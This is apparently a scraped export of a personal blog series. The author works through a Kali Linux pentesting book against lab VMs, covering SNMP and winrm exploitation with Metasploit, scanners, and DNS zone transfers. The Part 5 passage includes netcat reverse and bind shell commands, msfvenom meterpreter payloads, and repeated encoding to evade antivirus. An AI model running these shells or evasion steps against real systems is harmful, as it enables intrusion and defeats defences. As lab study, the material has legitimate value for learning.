PM Default Gateway . . . . . . . . . : DHCP Server . . . . . . . . . . . : 10.11.12.1 DHCPv6 IAID . . . . . . . . . . . : 319291431 DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2B-A8-88-83-08-00-27-D7-CC-D8 DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1 fec0:0:0:ffff::2%1 fec0:0:0:ffff::3%1 NetBIOS over Tcpip. . . . . . . . : Enabled Ethernet adapter Local Area Connection: Connection-specific DNS Suffix . : Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Desktop Adapter Physical Address. . . . . . . . . : 08-00-27-D7-CC-D8 DHCP Enabled. . . . . . . . . . . : Yes Autoconfiguration Enabled . . . . : Yes Link-local IPv6 Address . . . . . : fe80::fd63:83a2:85e3:4729%11(Preferred) IPv4 Address. . . . . . . . . . . : 172.30.1.21(Preferred) Subnet Mask . . . . . . . . . . . : 255.255.255.0 Lease Obtained. . . . . . . . . . : Saturday, May 04, 2024 10:15:28 PM Lease Expires . . . . . . . . . . : Saturday, May 04, 2024 10:35:28 PM Default Gateway . . . . . . . . . : DHCP Server . . . . . . . . . . . : 172.30.1.1 DHCPv6 IAID . . . . . . . . . . . : 235405351 DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2B-A8-88-83-08-00-27-D7-CC-D8 DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1 fec0:0:0:ffff::2%1 fec0:0:0:ffff::3%1 NetBIOS over Tcpip. . . . . . . . : Enabled Tunnel adapter isatap.{13E679E5-F4ED-4489-A265-22795E3ACF25}: Media State . . . . . . . . . . . : Media disconnected Connection-specific DNS Suffix . : Description . . . . . . . . . . . : Microsoft ISATAP Adapter Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0 DHCP Enabled. . . . . . . . . . . : No Autoconfiguration Enabled . . . . : Yes Tunnel adapter isatap.{6FEEDED4-FC1E-4857-BEB8-72167D5BDAA6}: Media State . . . . . . . . . . . : Media disconnected Connection-specific DNS Suffix . : Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2 Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0 DHCP Enabled. . . . . . . . . . . : No Autoconfiguration Enabled . . . . : Yes 7.2 Exploit winrm with MSF # Very simple for this version of winrm, load MSF module windows/winrm/winrm_script_exec and fill options: result:\nBruh we need a lil break from all this talk of computers, lets drink something Ꮚ˘ꍓ˘Ꮚ That feels much better, just a few more and we\u0026rsquo;re done, thank you for hanging in there even if you don\u0026rsquo;t fully understand, I\u0026rsquo;m just glad you\u0026rsquo;re reading this.\n8. Exploiting Simple Network Management Protocol SNMP with MSF # IT professionals will always look for innovative solutions to monitor assets on a network such as clients, servers, network devices. This is where SNMP comes in as it is a very popular networking protocol that allows them to do just that in an easy manner, it utilises User Datagram Protocol (UDP)\nPerforming an Nmap scan for both UDP and TCP on the common port of 161: $ sudo nmap -sU -sT -p U:161,T:161 172.30.1.21 Load MSF and the module scanner/snmp/snmp_enum Results:\n[+] 172.30.1.21, Connected. [*] System information: Host IP : 172.30.1.21 Hostname : vagrant-2008R2 Description : Hardware: Intel64 Family 6 Model 158 Stepping 10 AT/AT COMPATIBLE - Software: Windows Version 6.1 (Build 7601 Multiprocessor Free) Contact : - Location : - Uptime snmp : 00:44:55.75 Uptime system : 00:44:40.24 System date : 2024-5-4 23:00:14.2 [*] User accounts: [\u0026#34;sshd\u0026#34;] [\u0026#34;Guest\u0026#34;] [\u0026#34;greedo\u0026#34;] [\u0026#34;vagrant\u0026#34;] [\u0026#34;han_solo\u0026#34;] [\u0026#34;kylo_ren\u0026#34;] [\u0026#34;boba_fett\u0026#34;] [\u0026#34;chewbacca\u0026#34;] [\u0026#34;ben_kenobi\u0026#34;] [\u0026#34;jabba_hutt\u0026#34;] [\u0026#34;artoo_detoo\u0026#34;] [\u0026#34;c_three_pio\u0026#34;] [\u0026#34;darth_vader\u0026#34;] [\u0026#34;leia_organa\u0026#34;] [\u0026#34;sshd_server\u0026#34;] [\u0026#34;jarjar_binks\u0026#34;] [\u0026#34;Administrator\u0026#34;] [\u0026#34;luke_skywalker\u0026#34;] [\u0026#34;anakin_skywalker\u0026#34;] [\u0026#34;lando_calrissian\u0026#34;] [*] Network information: IP forwarding enabled : no Default TTL : 128 TCP segments received : 852430 TCP segments sent : 823689 TCP segments retrans : 0 Input datagrams : 292603 Delivered datagrams : 292896 Output datagrams : 407015 [*] Network interfaces: Interface : [ up ] Software Loopback Interface 1 Id : 1 Mac Address : ::::: Type : softwareLoopback Speed : 1073 Mbps MTU : 1500 In octets : 0 Out octets : 0 Interface : [ up ] WAN Miniport (SSTP) Id : 2 Mac Address : ::::: Type : unknown Speed : 1073 Mbps MTU : 4091 In octets : 0 Out octets : 0 Interface : [ up ] WAN Miniport (L2TP) Id : 3 Mac Address : ::::: Type : unknown Speed : 1073 Mbps MTU : 1460 In octets : 0 Out octets : 0 Interface : [ up ] WAN Miniport (PPTP) Id : 4 Mac Address : ::::: Type : unknown Speed : 1073 Mbps MTU : 1464 In octets : 0 Out octets : 0 Interface : [ up ] WAN Miniport (PPPOE) Id : 5 Mac Address : ::::: Type : ppp Speed : 1073 Mbps MTU : 1494 In octets : 0 Out octets : 0 Interface : [ up ] WAN Miniport (IPv6) Id : 6 Mac Address : 88:e2:20:52:41:53 Type : ethernet-csmacd Speed : 1073 Mbps MTU : 1500 In octets : 0 Out octets : 0 Interface : [ up ] WAN Miniport (Network Monitor) Id : 7 Mac Address : 88:e2:20:52:41:53 Type : ethernet-csmacd Speed : 1073 Mbps MTU : 1500 In octets : 0 Out octets : 0 Interface : [ up ] WAN Miniport (IP) Id : 8 Mac Address : 88:e2:20:52:41:53 Type : ethernet-csmacd Speed : 1073 Mbps MTU : 1500 In octets : 0 Out octets : 0 Interface : [ down ] RAS Async Adapter Id : 9 Mac Address : 20:41:53:59:4e:ff Type : ppp Speed : 0 Mbps MTU : 0 In octets : 0 Out octets : 0 Interface : [ up ] WAN Miniport (IKEv2) Id : 10 Mac Address : 00:00:00:00:00:00 Type : unknown Speed : 0 Mbps MTU : 1480 In octets : 0 Out octets : 0 Interface : [ up ] Intel(R) PRO/1000 MT Desktop Adapter Id : 11 Mac Address : 08:00:27:d7:cc:d8 Type : ethernet-csmacd Speed : 1000 Mbps MTU : 1500 In octets : 44474455 Out octets : 33542944 Interface : [ up ] Microsoft ISATAP Adapter Id : 12 Mac Address : 00:00:00:00:00:00 Type : unknown Speed : 0 Mbps MTU : 1280 In octets : 0 Out octets : 0 Interface : [ up ] Microsoft ISATAP Adapter #2 Id : 13 Mac Address : 00:00:00:00:00:00 Type : unknown Speed : 0 Mbps MTU : 1280 In octets : 0 Out octets : 0 Interface : [ up ] Intel(R) PRO/1000 MT Desktop Adapter #2 Id : 14 Mac Address : 08:00:27:66:c5:26 Type : ethernet-csmacd Speed : 1000 Mbps MTU : 1500 In octets : 6452 Out octets : 41251 Interface : [ up ] Intel(R) PRO/1000 MT Desktop Adapter-QoS Packet Scheduler-0000 Id : 15 Mac Address : 08:00:27:d7:cc:d8 Type : ethernet-csmacd Speed : 1000 Mbps MTU : 1500 In octets : 44474455 Out octets : 33542944 Interface : [ up ] Intel(R) PRO/1000 MT Desktop Adapter-WFP LightWeight Filter-0000 Id : 16 Mac Address : 08:00:27:d7:cc:d8 Type : ethernet-csmacd Speed : 1000 Mbps MTU : 1500 In octets : 44474455 Out octets : 33542944 Interface : [ up ] Intel(R) PRO/1000 MT Desktop Adapter #2-QoS Packet Scheduler-0000 Id : 17 Mac Address : 08:00:27:66:c5:26 Type : ethernet-csmacd Speed : 1000 Mbps MTU : 1500 In octets : 6452 Out octets : 41251 Interface : [ up ] Intel(R) PRO/1000 MT Desktop Adapter #2-WFP LightWeight Filter-0000 Id : 18 Mac Address : 08:00:27:66:c5:26 Type : ethernet-csmacd Speed : 1000 Mbps MTU : 1500 In octets : 6452 Out octets : 41251 9. Watering hole attacks # This section is more of a way to infect employees that work at an unpenetrable organisation which have though of every firewall technique and built up a wall so strong that it seems impossible to get in.\nThis is similar to medival times where the kings will build the best defense with water around the castle with a drop gate, have guards monitor day and night on the lookout for any wanderers to protect their people.\nA technique to get in would be to just sit and wait for someone to leave the castle to buy things at the markets outside the castle because the king charges too much for a coffee. You would wait until they\u0026rsquo;re distracted and go behind them in the shadows while they head back inside the castle.\nIn the Cyber World this is known as a watering hole attack which finds a tiny hole in the wall and go all in. This can be done by infecting a public wifi network e.g. coffee shops, bakeries, Mc Donalds and wait for them to connect which will allow us to plant a payload to be executed inside the organisation and boom, I\u0026rsquo;m sorry buts it\u0026rsquo;s already over from there.\n10. Conclusion # Well that\u0026rsquo;s enough of me yappin about computers, this book series is realy enjoyable and once I\u0026rsquo;m completed I will through myself in the trenches of the Wire in hopes to get better to defend the innocents against the Black Hat which their sole purpose on this earth is to wreak havoc.\nMotivated by Money, Power, Radical political views, extreme methods to spread word. They opperate underground, unreachable from the real world where they piggy back off Hostpitals, Charities, small start-ups, vulnerable people and even lost pet posters that offer a rewards for finding the pet. These are people that have their brain and \u0026ldquo;souls\u0026rdquo; fogged with these motives which bring a disgrace to humanity.\nThey may have reasons to do these things such as to provide for families but shutting down hostpitals, calling lost pet owners to send money to a wallet otherwise they won\u0026rsquo;t release their \u0026ldquo;found\u0026rdquo; lost pet is crossing the line. There are better ways to make money and just know, The internet never forgets and we will find you, just a matter of when.\nOoooooookkkkk that went a little dark ∩｡• ᵕ •｡∩ ♡\nUrm just wanted to say that if you\u0026rsquo;re reading this there will be more, I am starting to like this blog thing. It started out as a portfolio in Part 1 but it felt boring so I just started writing what I wanted. It feels freeing and actualy fun to learn again, you can do it with almost all discipline just add a bit of creativity in your work and be grateful for where you are currently in time.\nThis is too long I should shut up now, see you in the next one.\n","date":"11 Jun, 2024","externalUrl":null,"permalink":"/posts/part-6-all-on-networking-penetration-baby/","section":"Blog","summary":"Another sunny day here down the sea front, slight morning breeze, have a runny nose and sunsets are starting to look purple which are quite the site.","title":"Part 6 All on Networking Penetration Baby"},{"content":"","date":"11 Jun, 2024","externalUrl":null,"permalink":"/tags/password-attacks/","section":"Tags","summary":"","title":"Password-Attacks"},{"content":"Hey it\u0026rsquo;s me again , I know you\u0026rsquo;ve been missing me and I have to same to you as well. Time has changed in my life for the better, I\u0026rsquo;ve met the competitive hacking team at another close by University and would love to learn from them as they\u0026rsquo;re seniors in the field of CTF. I want to be by their side and learn from them to grow as a person and a professional penetration tester.\nI\u0026rsquo;ve also found a job at a college which has amazing architecture, truly wonderful to look at. I will use the funds to help me with travels for Uni, lunch and future projects that you might see on this blog so stay tuned. (^・ω・^ )\nAnyways, enough of a life update lets talk Networking and Shells! I will be exploring Netcat to create connections between my Kali machine and a victim Windows machine. Will also be going over Anti-malware evasion techniques to reduce Virustotal scores when scanning payloads created using scripts. And finally test out my wireless adapter that I got for cheap for packet injection and Monitor mode compatibility with Aireplay-ng.\nThis ones a short one guys so I\u0026rsquo;ll give it my best, I know I\u0026rsquo;m only using scripts and pre-made tools yet and not reversing engineering yet but put a bit of trust in me. I have a small flame inside of me, waiting for small chips of wood to be thrown inside to grow bigger into a roaring flame to not only light up my path in dark times but also for others I care about around me.\n1. Fundamentals of Bind and Reverse Shells # A reverse shell is a one way connection from the victim -\u0026gt; attacker, from there they would be able to perform remote code execution or monitor for the victims behaviour, keystrokes, screen sharing and more.\nA binding shell uses inbound firewall rules meaning that the connection originates from the victim -\u0026gt; attacker.\n1.2 Creating a Reverse \u0026amp; Binding Shell with Netcat # There is a Windows version of Netcat on Kali at this directory /usr/share/windows-binaries which will be uploaded to the victims computer which when executed will open the shell.\nGet the file onto the victims machine, for this example we will be connected on the same network and I will be using a Python server to transfer, cd into windows-binaries and execute python3 -m http.server 8080 On victims machine in a browser: \u0026lt;kaliIP\u0026gt;:8080 Click on nc.exe as the victim and close Python web server Execute the following in a terminal on kali nc -nlvp 1234 on bob\u0026rsquo;s nc -nv \u0026lt;kaliIP\u0026gt; 1234 -e cmd.exe To create a bind shell on kali nc -nlvp 1234 -e /bin/bash and on bob\u0026rsquo;s nc -nv \u0026lt;kaliIP\u0026gt; 1234, this will allow bob to send commands to kali ik this above isn\u0026rsquo;t what I\u0026rsquo;ve talked about as I\u0026rsquo;ve lost the gif for Netcat but here is a payload created by MSF using vnc.exe ^^\n2. Anti-malware Evasion Techniques # Most Anti malware work in 3 main categories:\nSignature-base detection: Anti-malware software will use a database of known malicious code and compare it to scans Behavioural-based detection: This is where the actions taken by malware is monitored by being placed in a Virtual environment for changes in the system Heuristic-based: This is where the anti-malware software uses rules and algorithms to determine if malware has been detected 2.1 Encoding Payloads with MSFvenom # Using the reverse shell from the Netcat shell executable I will be using MSFvenom which allows for custom payload creation via scripts. msfvenom -h # Help menu msfvenom --list payloads # Available Payload list # Create first payload msfvenom -p windows/meterpreter/reverse_tcp LHOST=\u0026lt;IP\u0026gt; LPORT=4444 -f exe -o payload.exe 2. Putting the payload.exe file into https://www.virustotal.com will give out these detection ratings: Virustotal and other mainstream web scanners will distribute the hash of the payload: A way to combat my malware being known is by using a no distribution scanner. 3. Using the highest rated encoder and iterating the encoding 9 times:\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=\u0026lt;IP\u0026gt; LPORT=4444 -f exe -o payload2.exe -e x86/shikata_ga_nai -i 9 Doesn\u0026rsquo;t even lower it by much 😭😭\nGiving it a executable to encode with the template to mask out anti-malware signature detection msfvenom -p windows/meterpreter/reverse_tcp LHOST=\u0026lt;IP\u0026gt; LPORT=4444 -f exe -o payload2.exe -e x86/shikata_ga_nai -i 9 -x /etc/share/windows-binaries/whoami.exe 2.2 Using Shellter to reduce detection # Go through the Wine installation guide with wine32 and install Shellter with sudo apt install shellter 2.3 Using MSF to Send a Reverse Shell Attack # Will need to transfer file same method as transferring ncat in part 1.2 Will be using metasploitable to listen to the payload $ msfconsole msf6 \u0026gt; use exploit/multi/handler msf6 (multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp msf6 (multi/handler) \u0026gt; set LHOST \u0026lt;attacker IP\u0026gt; msf6 (multi/handler) \u0026gt; set AutoRunScript post/windows/manage/migrate msf6 (multi/handler) \u0026gt; exploit (Right-click \u0026gt; Open Image in New Tab)\n3. Wireless Adaptor Setup # For the final part of this section I will be testing out my wireless adapter which was bought off Aliexpress a long time ago and just resurfaced for this which I\u0026rsquo;m happy about.\n3.1 Different types of Adaptor Modes # There are several modes available for a network adaptor to switch to which all have their separate purposes:\nManaged mode: The default type which will allow connections to other AP Monitor mode: This mode will allow for wireless network scanning and packet injection Repeater mode: Echo\u0026rsquo;s a WiFi connection like an extender Master mode: Allow Linux-based system to operate as APs' 3.2 Changing between Managed and Monitor Mode # There are two main methods to enable monitor and switching back to managed mode:\nManually: $ ifconfig wlan0 down $ iwconfig mode monitor wlan0 $ ifconfig wlan0 up Using airmon-ng: $ airmon-ng check kill $ airmon-ng start wlan0 $ airmon-ng stop wlan0 3.3 Testing for Packet Injection Compatibility # Once in monitor mode I can see if the adaptor has packet injection capabilities with aireplay-ng -9 wlan0\nWell this pretty much covers everything for the fifth part of ‘The Ultimate Kali Linux Book’ by Glen D. Singh. This was a short one but I learned a bit on the different shell types, using encoders to mask out known exploits by anti-malware software and testing out my wireless adapter for later testing. Glad you had a good read for this one, hope you\u0026rsquo;re doing OK wherever you are. Bye. ","date":"22 May, 2024","externalUrl":null,"permalink":"/posts/part-5-understanding-reverse-and-binding-shell/","section":"Blog","summary":"Hey it\u0026rsquo;s me again , I know you\u0026rsquo;ve been missing me and I have to same to you as well.","title":"Part 5 Understanding Reverse and Binding Shell"},{"content":"","date":"22 May, 2024","externalUrl":null,"permalink":"/tags/shells/","section":"Tags","summary":"","title":"Shells"},{"content":"","date":"26 Apr, 2024","externalUrl":null,"permalink":"/tags/osint/","section":"Tags","summary":"","title":"OSINT"},{"content":"Ever wondered what would be an effective way to find vulnerabilities within your organisational systems with ease﹖ Well in this section I will be covering vulnerability scanners for overall systems and websites which provide amazing reports within minutes!\nWelcome to the fourth part of the my walkthrough of ‘The Ultimate Kali Linux Book’ by Glen D. Singh. Ever wondered what kind of tools professional penetration testers use to discover vulnerabilities? What to do once you have scanned for technology version? Where to find critical security issues in systems? Well all that will be answered in this section.\n1. Nessus # Nessus is a service which utilises all sort of scanning techniques and provides a central hub accessed through your browser which makes it easy to manage scans.\n1.2 How to Install Nessus on Kali # First install the deb file on Kali linux provided on Tenable Nessus official download page: https://www.tenable.com/downloads/nessus?loginAttempted=true This should be for platform Linux-Debian-amd64 Debian 10, 11, 12 / Kali Linux\nChange directory where file is download and execute the following commands: $ sudo dpkg -i Nessus-8.15.0-debian6_amd64.deb $ sudo systemctl start nessusd Go to https://kali:8834 in your browser and accept warning to enter the login portal of nessus Register for a activation code at https://www.tenable.com/products/nessus/nessus-essentials and go through the Nessus Essential installation process within the browser setup. If login page is shown instead of activation wizard setup within the web portal, use this guide to register offline: https://community.tenable.com/s/article/How-to-reset-register-your-Nessus-license-for-offline-installations?language=en_US\n1.3 Basic Scans With Nessus # When the setup is completed you will be prompted with the option to provide the program with a list of targets to scan which I\u0026rsquo;ve entered the [Win2k8 IP address from chapter 1]: This will start an automatic Basic scan which will reveal surface-level vulnerabilities which can be seen in the \u0026lsquo;My Scans\u0026rsquo; section in the navigation menu.\nWhen navigating to \u0026lsquo;New scan\u0026rsquo; Nessus will provide different types of scans to choose from ranging from full-fledged scans to specific vulnerability scans: Main types of scans: Host Discovery Basic Network Scan Advanced Scan Malware Scan The basic scan option is great to generate a quick report on surface-level vulnerabilities: I can see the different results from the basic scan which are separated into different types folders which upon clicking will reveal findings of vulnerabilities, version types and information on technology used by the target:\nHere I am looking at the Apache Tomcat folder which will provide further information as to what can be exploited along with the CVE code: A scan will provide vulnerabilities along with it Common vulnerability Score System (CVSS) out of 10 to show danger levels which can be determined by this calculator https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:N/SI:N/SA:N 2. Making Use Of Nmap\u0026rsquo;s Scripting Engine NSE # For more information check out the documentation at: https://nmap.org/book/nse.html Nmap scripting engine is a repository of scripts which are separated into different categories which can be used along with scans to enrich the reconnaissance phase.\nThe defined categories are as followed: auth, broadcast, brute, default. discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln\nSee available scripts at: https://nmap.org/nsedoc/scripts/ nmap --script-help \u0026#34;afp-* and discovery\u0026#34; nmap --script=\u0026lt;keyword\u0026gt; nmap --script=ftp-vsftpd-backdoor 172.30.1.20 nmap --script=vuln 172.30.1.20 3. Greenbone Vulnerability Mananger GVM # Greenbone Community Edition has come to its end-of-life in Jan 2023 and will be fully off Docker hub by June 2024 :( See link for more details: GVM Community Edition 21.04 End of Life This tool seems to be similar to nessus tool which provides lots of options for reconnaissance.\nsudo apt install gvm sudo gvm-setup sudo gvm-start sudo runuser -u _gvm -- gvmd --user=admin --new-password=new_password # reset pass When performing the setup commands for GVM you will be provided with a admin password, make a note of this as this is important as it is needed for the sign in page in your browser: Upon login in you will see the main dashboard with charts, select Configuration \u0026gt; Targets \u0026gt; New Target: After setting a target create a task in Scans \u0026gt; Tasks to perform a basic automated scan on the target you\u0026rsquo;ve set earlier 🚧 Incomplete section, need to make time to properly try GVM due to Community version loosing official support. Full installation guide here: https://forum.greenbone.net/t/greenbone-community-edition-22-4-stable-initial-release-2022-07-25/12638 🚧\n4. Using Web Application Scanners # Scanning a machine for all possible vulnerabilities on the surface level is good but what if your target is a website? Well here I will be covering just the surface of different web application scanners which may reveal information that can be of use as a pentester.\n4.1 WhatWeb # Whatweb is a recon tool used to retrieve different aspect of websites such as web servers, OS, content management system and other technologies by sending HTTP request and analysing the response.\nHere is an example of it being used with whatweb \u0026lt;IP\u0026gt;: Whoah, that\u0026rsquo;s a lot of information received from just a basic scan!\nThis tool provides custom depth searches and HTTP header customisation which I will be playing with more in the future so stay tuned.\n4.2 Using NSE Web Application Scanning Scripts # If you remember from earlier we looked at Nmap\u0026rsquo;s scripting engine which provided a huge library of ready-to-use battle scripts for both recon and exploitation.\nTo look at the scripts available for web application you can use pattern search to list what\u0026rsquo;s out there with\n$ ls /usr/share/nmap/scripts/http* Here are some of the results for http result alone!\n/usr/share/nmap/scripts/http-open-redirect.nse /usr/share/nmap/scripts/http-passwd.nse /usr/share/nmap/scripts/http-phpmyadmin-dir-traversal.nse /usr/share/nmap/scripts/http-phpself-xss.nse /usr/share/nmap/scripts/http-php-version.nse /usr/share/nmap/scripts/http-proxy-brute.nse /usr/share/nmap/scripts/http-put.nse /usr/share/nmap/scripts/http-qnap-nas-info.nse /usr/share/nmap/scripts/http-referer-checker.nse /usr/share/nmap/scripts/http-rfi-spider.nse /usr/share/nmap/scripts/http-robots.txt.nse /usr/share/nmap/scripts/http-robtex-reverse-ip.nse /usr/share/nmap/scripts/http-robtex-shared-ns.nse /usr/share/nmap/scripts/http-sap-netweaver-leak.nse /usr/share/nmap/scripts/http-security-headers.nse /usr/share/nmap/scripts/http-server-header.nse /usr/share/nmap/scripts/http-shellshock.nse /usr/share/nmap/scripts/http-sitemap-generator.nse /usr/share/nmap/scripts/http-slowloris-check.nse /usr/share/nmap/scripts/http-slowloris.nse **/usr/share/nmap/scripts/http-sql-injection.nse** /usr/share/nmap/scripts/https-redirect.nse /usr/share/nmap/scripts/http-stored-xss.nse There are so many it\u0026rsquo;s excitingly overwhelming but don\u0026rsquo;t worry, well go through one example together. I\u0026rsquo;ve highlighted one of the sql injection script near the bottom as a way to demonstrate script functions.\n# Use sql-injection detection on port 80 $ nmap --script http-sql-injection -p 80 \u0026lt;IP\u0026gt; # Use all scripts starting with \u0026#34;http-\u0026#34; $ nmap --script \u0026#34;http-*\u0026#34; -p 80 \u0026lt;IP\u0026gt; For more information check out the documentation at: https://nmap.org/book/nse.html 4.3 Making Use Of Metasploit\u0026rsquo;s Wmap Scanning Tool # Metasploitable is truly the swiss army of reconnaissance and exploitation, another feature it provides are in-built plugins which provide unique functions compared to the scripts provided by MS.\nWe can load the module within MS with load wmap, if you\u0026rsquo;re curious as to what other plugins available use: load -l Set a main site to tell wmap where it should be scanning, I will be using the Broken OWASP Web application virtual machine created in the labs section:\nmsf6 \u0026gt; wmap_sites -a 172.30.1.23 Specify a directory to perform enumeration on, here I will be using the the \u0026lsquo;mutilliadae\u0026rsquo; challenge: msf6 \u0026gt; wmap_targets -t 172.30.1.23/mutilliadae/ Then perform the attack! msf6 \u0026gt; wmap_targets -l # List targets from sites msf6 \u0026gt; wmap_run -t # List all loaded modules for scans msf6 \u0026gt; wmap_run -e # Run all scans on target 4.4 Nikto # This is an open-source reconnaissance tool for web vulnerabilities, it is helpful to get an overview of what technologies a website is using and potential known vulnerabilities it may have.\nGithub repo: https://github.com/sullo/nikto This tool should come pre-install with Kali but if not, install it using the Github link.\n$ nikto --help # Display help menu $ nikto -h 172.30.1.23 -F csv -o ~/Desktop/result.csv # Set target and save result as csv file This reveals a lot of valuable information on systems that might have misconfigured web technologies which is worth using for a simple tool.\n4.5 WPScan for WordPress websites # WordPress is a framework which allows users to use as an aid for building websites which is similar to Hugo which is what my blog is using.\nWPscan is a pre-install tool on Kali for specifically scanning WordPress websites. To test this I will be using OWASP BWA machine from Part-1:\nTarget: 172.30.1.23/wordpress\n# Display help menu $ wpscan --help # Scan url with user enumeration $ wpscan --url 172.30.1.23/wordpress -e u Results from scan:\nAdmin user name login found:\nThat concludes everything for this part of The Ultimate Kali Linux Book I am reading which is exciting to go through and learn all the different types of helpful tool that I could potentially use on my Pentesting / Hacking journey. Can\u0026rsquo;t wait to see you there for the next one, cheers.\n","date":"26 Apr, 2024","externalUrl":null,"permalink":"/posts/part-4-performing-vulnerability-assessments/","section":"Blog","summary":"Ever wondered what would be an effective way to find vulnerabilities within your organisational systems with ease﹖ Well in this section I will be covering vulnerability scanners for overall systems and websites which provide amazing reports within minutes!","title":"Part 4 Performing Vulnerability Assessments"},{"content":"","date":"26 Apr, 2024","externalUrl":null,"permalink":"/tags/vulnerability/","section":"Tags","summary":"","title":"Vulnerability"},{"content":"","date":"9 Apr, 2024","externalUrl":null,"permalink":"/tags/dns/","section":"Tags","summary":"","title":"DNS"},{"content":"Scratching the surface of the vast world of active recon, exploring tools which provide juicy information such as nmap, metasploit, netdiscover and more.\nWelcome to the third part of the my walkthrough of ‘The Ultimate Kali Linux Book’ by Glen D. Singh, in this section I\u0026rsquo;ll be going over some active information techniques. These directly interacts with the target which is helpful at collecting juicy information such as ports which can be later on exploited for vulnerabilities and all the exciting stuff.\n1. DNS reconnaissance and zone transfers # When wanting to explore a certain website you will be likely familiar with entering it\u0026rsquo;s name known as a domain (e.g. YouTube.com) which will redirect you to its landing page.\nUnder the hood of the internet we have what\u0026rsquo;s called a domain name server which sole purpose is to take the URL you\u0026rsquo;ve typed and convert it into an IP address which a browser can understand to connect to the correct computer over the world wide web. Similar to a phone book where you\u0026rsquo;d look up the name of a person and find their dial number.\n1.2 Different types of DNS records # A DNS lookup tool will provide different types of records which can give valuable information to create a strong profile on a target.\nThe following are the different record types:\nA: Resolves a hostname to an IPv4 address. AAAA: Resolves a hostname to an IPv6 address. NS: Contains the name servers\u0026rsquo; information. MX: Contains the mail exchange (email) servers. PTR: Resolves an IP address to a hostname. CNAME: Provides a canonical name or an alias. RP: Specifies the person that\u0026rsquo;s responsible for the domain. SOA: Contains information about the administrator of the domain. SRV: Contains a service port number for a specific service of the domain Performing DNS enumeration techniques can provides information such as IP ranges, subdomains, email servers.\n1.3 Scanning for subdomains and name servers # # Display name servers (ns) using host $ host -t ns zonetransfer.me # Display subdomains using dnsmap dnsmap microsoft.com 2. Zone transfers vulnerabilities # Sometimes when setting up a website either by hosting it yourself or going with a service provider there may be some misconfigurations such as allowing zone transfers.\nIts purpose is to allow domain server to easily transfer old records of a known URL to create redundancy incase the primary server is down. Upon request if misconfigured, the DNS will send all records it currently has on a URL which can be used to exploits other part of a target.\n2.1 Performing a zone transfer attack # My target will be zonetransfer.me which has been configure to accept all zone transfer requests for demonstration purposes.\nRetrieve a name server using the [Whois tool]\nUsing the dig command on kali: dig axfr @nsztm2.digi.ninja zonetransfer.me\n; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.19.21-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr @nsztm2.digi.ninja zonetransfer.me ; (1 server found) ;; global options: +cmd zonetransfer.me. 7200 IN SOA nsztm1.digi.ninja. robin.digi.ninja. 2019100801 172800 900 1209600 3600 zonetransfer.me. 300 IN HINFO \u0026#34;Casio fx-700G\u0026#34; \u0026#34;Windows XP\u0026#34; zonetransfer.me. 301 IN TXT \u0026#34;google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA\u0026#34; zonetransfer.me. 7200 IN MX 0 ASPMX.L.GOOGLE.COM. zonetransfer.me. 7200 IN MX 10 ALT1.ASPMX.L.GOOGLE.COM. zonetransfer.me. 7200 IN MX 10 ALT2.ASPMX.L.GOOGLE.COM. zonetransfer.me. 7200 IN MX 20 ASPMX2.GOOGLEMAIL.COM. zonetransfer.me. 7200 IN MX 20 ASPMX3.GOOGLEMAIL.COM. zonetransfer.me. 7200 IN MX 20 ASPMX4.GOOGLEMAIL.COM. zonetransfer.me. 7200 IN MX 20 ASPMX5.GOOGLEMAIL.COM. zonetransfer.me. 7200 IN A 5.196.105.14 zonetransfer.me. 7200 IN NS nsztm1.digi.ninja. zonetransfer.me. 7200 IN NS nsztm2.digi.ninja. _acme-challenge.zonetransfer.me. 301 IN TXT \u0026#34;2acOp15rSxBpyF6L7TqnAoW8aI0vqMU5kpXQW7q4egc\u0026#34; _acme-challenge.zonetransfer.me. 301 IN TXT \u0026#34;6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI\u0026#34; _sip._tcp.zonetransfer.me. 14000 IN SRV 0 0 5060 www.zonetransfer.me. 14.105.196.5.IN-ADDR.ARPA.zonetransfer.me. 7200 IN PTR www.zonetransfer.me. asfdbauthdns.zonetransfer.me. 7900 IN AFSDB 1 asfdbbox.zonetransfer.me. asfdbbox.zonetransfer.me. 7200 IN A 127.0.0.1 asfdbvolume.zonetransfer.me. 7800 IN AFSDB 1 asfdbbox.zonetransfer.me. canberra-office.zonetransfer.me. 7200 IN A 202.14.81.230 cmdexec.zonetransfer.me. 300 IN TXT \u0026#34;; ls\u0026#34; contact.zonetransfer.me. 2592000 IN TXT \u0026#34;Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes\u0026#34; dc-office.zonetransfer.me. 7200 IN A 143.228.181.132 deadbeef.zonetransfer.me. 7201 IN AAAA dead:beaf:: dr.zonetransfer.me. 300 IN LOC 53 20 56.558 N 1 38 33.526 W 0.00m 1m 10000m 10m DZC.zonetransfer.me. 7200 IN TXT \u0026#34;AbCdEfG\u0026#34; email.zonetransfer.me. 2222 IN NAPTR 1 1 \u0026#34;P\u0026#34; \u0026#34;E2U+email\u0026#34; \u0026#34;\u0026#34; email.zonetransfer.me.zonetransfer.me. email.zonetransfer.me. 7200 IN A 74.125.206.26 Hello.zonetransfer.me. 7200 IN TXT \u0026#34;Hi to Josh and all his class\u0026#34; home.zonetransfer.me. 7200 IN A 127.0.0.1 Info.zonetransfer.me. 7200 IN TXT \u0026#34;ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information.\u0026#34; internal.zonetransfer.me. 300 IN NS intns1.zonetransfer.me. internal.zonetransfer.me. 300 IN NS intns2.zonetransfer.me. intns1.zonetransfer.me. 300 IN A 81.4.108.41 